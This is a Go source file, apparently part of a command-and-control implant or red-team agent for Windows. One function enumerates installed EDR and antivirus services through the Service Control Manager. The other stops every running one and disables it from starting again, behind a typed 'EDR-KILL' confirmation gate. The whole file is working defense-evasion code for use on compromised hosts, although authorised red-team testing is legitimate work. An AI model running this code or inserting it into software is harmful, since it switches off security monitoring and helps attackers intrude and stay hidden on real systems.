//go:build windows

package commands

import (
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

// serviceEdrEnumWindows enumerates EDR/AV services on Windows via SCM.
func serviceEdrEnumWindows() structs.CommandResult {
	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	candidates := edrMatchesForPlatform("windows")
	var results []edrEnumResult

	for _, entry := range candidates {
		s, err := m.OpenService(entry.ServiceName)
		if err != nil {
			continue // Service not installed
		}

		status, err := s.Query()
		s.Close()

		statusStr := "unknown"
		if err == nil {
			switch status.State {
			case svc.Running:
				statusStr = "running"
			case svc.Stopped:
				statusStr = "stopped"
			case svc.Paused:
				statusStr = "paused"
			case svc.StartPending:
				statusStr = "starting"
			case svc.StopPending:
				statusStr = "stopping"
			}
		}

		results = append(results, edrEnumResult{
			ServiceName: entry.ServiceName,
			Vendor:      entry.Vendor,
			Product:     entry.Product,
			Status:      statusStr,
		})
	}

	return successResult(formatEdrEnumResults(results))
}

// serviceEdrKillWindows attempts to stop and disable detected EDR/AV services.
func serviceEdrKillWindows(args serviceArgs) structs.CommandResult {
	if strings.ToUpper(args.Confirm) != "EDR-KILL" {
		return errorResult("Error: EDR-KILL requires -confirm EDR-KILL safety gate. This will attempt to stop and disable security services.")
	}

	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	candidates := edrMatchesForPlatform("windows")
	var sb strings.Builder
	sb.WriteString("[*] EDR/AV Service Kill Results:\n\n")

	killed := 0
	failed := 0

	for _, entry := range candidates {
		s, err := m.OpenService(entry.ServiceName)
		if err != nil {
			continue // Not installed
		}

		status, err := s.Query()
		if err != nil {
			s.Close()
			continue
		}

		if status.State != svc.Running {
			s.Close()
			continue
		}

		// Attempt to stop
		_, stopErr := s.Control(svc.Stop)

		// Attempt to disable
		cfg, cfgErr := s.Config()
		disableErr := ""
		if cfgErr == nil {
			cfg.StartType = mgr.StartDisabled
			disableErr = ""
			if err := s.UpdateConfig(cfg); err != nil {
				disableErr = err.Error()
			}
		}

		s.Close()

		if stopErr != nil {
			sb.WriteString(fmt.Sprintf("  [!] %s (%s): STOP FAILED — %v\n", entry.ServiceName, entry.Product, stopErr))
			failed++
		} else if disableErr != "" {
			sb.WriteString(fmt.Sprintf("  [~] %s (%s): STOPPED but disable failed — %s\n", entry.ServiceName, entry.Product, disableErr))
			killed++
		} else {
			sb.WriteString(fmt.Sprintf("  [+] %s (%s): STOPPED + DISABLED\n", entry.ServiceName, entry.Product))
			killed++
		}
	}

	if killed == 0 && failed == 0 {
		sb.WriteString("  No running EDR/AV services found to stop.\n")
	} else {
		sb.WriteString(fmt.Sprintf("\n  Summary: %d stopped, %d failed\n", killed, failed))
	}

	return successResult(sb.String())
}
